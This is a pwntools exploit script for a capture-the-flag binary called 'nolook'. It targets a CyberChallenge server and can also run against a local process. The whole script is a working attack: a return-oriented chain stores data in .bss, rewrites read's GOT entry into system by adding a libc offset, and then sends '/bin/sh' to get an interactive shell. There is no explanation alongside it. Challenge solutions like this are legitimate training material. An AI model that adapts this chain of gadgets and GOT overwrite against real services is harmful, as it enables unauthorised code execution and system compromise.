#!/usr/bin/env python3
from pwn import *
import time

bin_name = "./nolook_patched"
elf = context.binary = ELF(bin_name)

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("nolook.challs.cyberchallenge.it", 9135)
    else:
        return process(elf.path)

def main():
    r = conn()
    add_r14_15 = 0x4005af   #r14 + 0x90
    pop_14_15 = 0x400680
    pop_rsi_r15 = 0x400681
    pop_rdi = 0x4005a7
    bssaddr  = elf.bss() + 0x100
    ret = 0x40048e

    libc = ELF("libc.so.6")
    payload = flat({24:[
        pop_rdi,
        0,
        pop_rsi_r15,
        bssaddr,
        0,
        elf.plt['read'],

        pop_14_15,
        elf.got['read']-0x90,
        libc.sym['system'] - libc.sym['read'],
        add_r14_15,

        ret,
        
        pop_rdi,
        bssaddr,
        elf.plt['read'],


    ]})

    r.send(payload)
    time.sleep(0.2)
    r.send(b'/bin/sh\x00')
    r.interactive()

if __name__ == "__main__":
    main()